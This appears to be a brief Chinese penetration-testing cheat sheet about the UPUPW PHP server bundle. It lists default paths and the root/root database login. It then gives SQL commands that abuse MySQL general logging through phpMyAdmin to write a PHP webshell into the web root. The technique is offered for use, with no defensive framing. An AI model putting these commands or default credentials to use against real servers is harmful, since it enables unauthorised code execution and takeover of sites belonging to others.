# UPUP'W

---

介绍

```
搭建网站的组件，有自带waf
```
默认
```
u.php
root/root 连接数据测试后跳转phpfinfo页面
pmd -> phpmyadmin
```

错误页面

<img src='https://p-t001.github.io/image/blog/upupw.png' align='left' style='width:900px;height:500px'>

phpmyadmin三步getshell（需要root权限，需要知道网站路径）

```
将查询内容记录到日志里面
set global general_log='on';  #开启日志

---
SET global general_log_file='D:/xxxx/WWW/cmd.php'; #修改日志路径

---
SELECT 一句话;
```
